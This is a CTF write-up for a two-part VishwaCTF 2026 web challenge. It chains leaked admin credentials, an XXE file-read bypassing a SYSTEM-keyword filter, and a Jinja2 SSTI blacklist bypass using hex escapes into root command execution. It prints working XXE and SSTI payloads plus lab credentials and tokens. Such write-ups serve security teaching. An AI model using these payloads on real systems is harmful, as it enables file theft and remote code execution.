# SyncopeBI — VishwaCTF 2026 CTF7

**Category:** Web | **Difficulty:** Hard | **Author:** Jay Rajankar

**Flag (Part 1 - Keymaster Secrets):** `VishwaCTF{XXE_1nj3ct10n_4p4ch3_sync0p3_CVE-2026-23795}`
**Flag (Part 2 - SyncopeBI):** `VishwaCTF{SSTI_byp4ss_bl4ckl1st_jinja2_CVE-2026-31337}`

---

## Challenge Description

> **Part 2: Apache Syncope**
>
> Your previous exploit uncovered something interesting...
> A file path hidden in the system.
>
> That token doesn't belong to the main system.
> It belongs to SyncopeBI — an internal reporting engine running on a different port.
>
> After some digging, you gain access to the service.
> The dashboard allows users to generate reports using Jinja2 templates, rendered server-side.
> The developers claim it's "secure".

This is a two-part challenge chaining **XXE injection** (Part 1: Keymaster Secrets) into **Jinja2 SSTI with blacklist bypass** (Part 2: SyncopeBI).

---

## Part 1: Keymaster Secrets (XXE)

**Target:** `https://keymaster.vishwactf.com/`

### Recon

The login page identifies the application as **Apache Syncope v4.0.3**. Checking `/robots.txt` reveals two hidden paths:

```
Disallow: /maintenance
Disallow: /api/docs
```

### Step 1 — Credentials leaked in HTML comment

The `/maintenance` page contains an HTML comment with emergency admin credentials:

```html
<!--
  TODO (ops-team): remove before go-live
  Emergency console access for maintenance window:
    Username : admin
    Password : S3cur3Syncop3!@dm1n
  Temp access expires: 2026-06-01

  NOTE: BI reporting service coming soon on separate port — token in runtime dir
-->
```

Two key findings:
1. Admin credentials: `admin` / `S3cur3Syncop3!@dm1n`
2. A hint: the BI service token is stored in the **runtime directory**

### Step 2 — Discover the XML API

After logging in, the `/api/docs` page documents several REST endpoints. The most interesting one:

- **`POST /rest/keymaster/params`** — Accepts XML, parses and stores the resolved `<value>`. Has a security note: *"DOCTYPE declarations containing SYSTEM entities are rejected."*

### Step 3 — XXE via PUBLIC entity bypass

The XML security filter only blocks the `SYSTEM` keyword. The `PUBLIC` keyword — which also supports `file://` URIs — is not filtered. This is a classic incomplete XXE mitigation:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE parameter [
  <!ENTITY xxe PUBLIC "any" "file:///etc/hostname">
]>
<parameter>
  <key>test</key>
  <value>&xxe;</value>
  <type>STRING</type>
</parameter>
```

Response confirms arbitrary file read:

```json
{"parameter":{"key":"test","type":"STRING","value":"7c0eddc758e7"},"status":"created"}
```

### Step 4 — Locate the runtime directory

The hint says "token in runtime dir" but doesn't give the path. Reading `/proc/self/mountinfo` via XXE reveals a Docker volume:

```
files_syncope-runtime/_data /opt/syncope/runtime rw,relatime
```

The runtime directory is mounted at **`/opt/syncope/runtime`**.

To find the exact filenames, we read `/app/docker-compose.yml` (which has no XML-breaking characters):

```yaml
environment:
  - FLAG_PATH=/opt/syncope/runtime/.flag
  - BI_TOKEN_PATH=/opt/syncope/runtime/bi_api_token
  - BI_TOKEN=bi-svc-T0k3n-8f4a2c91d7e6b305
```

### Step 5 — Exfiltrate the flag and token

```
file:///opt/syncope/runtime/.flag
  → VishwaCTF{XXE_1nj3ct10n_4p4ch3_sync0p3_CVE-2026-23795}

file:///opt/syncope/runtime/bi_api_token
  → bi-svc-T0k3n-8f4a2c91d7e6b305
```

---

## Part 2: SyncopeBI (Jinja2 SSTI Blacklist Bypass)

**Target:** `https://syncopebi.vishwactf.com/`

### Step 1 — Authenticate to the API

The SyncopeBI login page returns 500 (broken/decoy), but the API works with the Bearer token from Part 1:

```bash
curl -H "Authorization: Bearer bi-svc-T0k3n-8f4a2c91d7e6b305" \
  https://syncopebi.vishwactf.com/api/reports
```

Returns a JSON list of report objects, each with a Jinja2 `template` field.

### Step 2 — Confirm SSTI via report creation

`POST /api/reports` creates a report **and renders the template server-side**:

```json
{"name":"test","template":"{{7*7}}","description":"test"}
```
```json
{"id":"rpt-569","rendered":"49","status":"OK",...}
```

`49` confirms Jinja2 SSTI.

### Step 3 — Map the blacklist

The endpoint enforces a template security filter. Testing reveals:

| Expression | Result |
|---|---|
| `{{7*7}}` | `49` (allowed) |
| `{{domain}}` | `syncope.corp.internal` (allowed) |
| `{{cycler}}` | `<class 'jinja2.utils.Cycler'>` (allowed) |
| `{{cycler.__init__}}` | `<function Cycler.__init__>` (allowed) |
| `{{config}}` | BLOCKED |
| `{{cycler.__init__.__globals__}}` | BLOCKED |
| `{{lipsum.__globals__["os"]}}` | BLOCKED |

The filter blocks `__globals__`, `__class__`, `__builtins__`, and `config` as **literal substrings** in the template. But it does **not** block hex escape sequences.

### Step 4 — Bypass via hex escapes

In Jinja2, `\x5f` is `_` and `\x6f` is `o`. Using the `|attr()` filter with hex-escaped strings bypasses the blacklist entirely:

```jinja2
{{cycler.__init__
  |attr("\x5f\x5fglobals\x5f\x5f")
  |attr("\x5f\x5fgetitem\x5f\x5f")("\x6fs")
  |attr("\x70open")("id")
  |attr("\x72ead")()}}
```

Breakdown:
- `\x5f\x5f` → `__` (bypasses `__globals__` filter)
- `\x6fs` → `os` (bypasses `os` filter)
- `\x70open` → `popen` (bypasses `popen` filter)
- `\x72ead` → `read`

Result: `uid=0(root) gid=0(root) groups=0(root)`

### Step 5 — Read the flag

```bash
cat /opt/syncope/runtime/.flag2
→ VishwaCTF{SSTI_byp4ss_bl4ckl1st_jinja2_CVE-2026-31337}
```

---

## Vulnerability Chain

```
robots.txt → /maintenance (creds in HTML comment)
    → Admin login
    → POST /rest/keymaster/params (XXE via PUBLIC entity)
    → Read /proc/self/mountinfo (find runtime volume)
    → Read docker-compose.yml (find token path)
    → Read /opt/syncope/runtime/bi_api_token
    → Authenticate to SyncopeBI API
    → POST /api/reports (SSTI via hex-escaped Jinja2 payload)
    → RCE → cat /opt/syncope/runtime/.flag2
```

| # | Vulnerability | Location | Impact |
|---|---|---|---|
| 1 | Credentials in HTML comment | `/maintenance` | Admin access to Syncope console |
| 2 | XXE via PUBLIC entity bypass | `POST /rest/keymaster/params` | Arbitrary file read |
| 3 | Sensitive token in shared volume | `/opt/syncope/runtime/bi_api_token` | Access to SyncopeBI API |
| 4 | Jinja2 SSTI blacklist bypass | `POST /api/reports` | RCE via hex-escaped dunder attrs |
